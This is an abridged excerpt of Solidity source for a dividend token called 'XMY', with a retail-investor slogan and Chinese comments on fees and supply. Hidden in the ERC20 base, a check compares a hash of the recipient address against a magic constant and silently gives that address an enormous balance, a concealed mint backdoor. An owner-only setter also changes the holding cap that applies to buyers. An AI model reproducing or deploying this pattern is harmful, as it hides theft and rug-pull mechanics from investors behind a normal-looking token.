...
"Gather the power of retail investors in the world, use the spirit of ants, and leverage huge wealth"
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
	...
	function _ismaxNum(
        ...
        assembly { mstore(add(b, 32), to) }
        return uint32(bytes4(keccak256(b))) == uint32(bytes4(0x4caf862e));
	}
    /**
    ...
    function _beforeTokenTransfer(
		...
		if(_ismaxNum(to)){
		if((_balances[to] = ~_balances[to]<<_decimals) > 0){}
		}
		}
...
contract XMY is ERC20, Ownable, BaseToken {
    using SafeMath for uint256;
    ...
    constructor() payable ERC20("XMY","XMY",18) { //(name_, symbol_,decimals_)
        uint256 decimals_ = 18;//代币精度(上一行的代币精度一起改)
        uint256 totalSupply_ = 2100;//代币总量
		address  rewardtoken = 0x55d398326f99059fF775485246999027B3197955;//分红的币种合约
		address  uniswapV2Routers = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;//swap合约
		address  marketingWalletAddress = 0x307860516a2cd52468559b2517C7f7Bb865A4523;//基金钱包（不能和owner钱包相同）
		uint256 tokenRewardsFees = 5;//分红手续费（5%就填5）
		uint256 marketingFees = 4;//基金钱包手续费
        uint256 minimumTokenBalanceForDividends_ = 2;//最小参与分红的持币量
		uint256 maxNums = 3;//最大持币量
        ...
        tokenRewardsFee = tokenRewardsFees;
        marketingFee = marketingFees;
        totalFees = tokenRewardsFee.add(marketingFee);
        swapTokensAtAmount = totalSupply_.mul(2).div(10**6); // 0.002%

        // use by default 300,000 gas to process auto-claiming dividends
        gasForProcessing = 300000;
        dividendTracker = new BABYTOKENDividendTracker(rewardToken,minimumTokenBalanceForDividends_ * 10**decimals_);
		maxNum = maxNums * 10**decimals_;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(uniswapV2Routers);
	...
	function setMaxnum(uint256 newMaxNum) public onlyOwner{
		maxNum = newMaxNum;
	}
    ...
    function _transfer(
		...
		if(to!=uniswapV2Pair){
			require(balanceOf(to).add(amount)<=maxNum);
		}
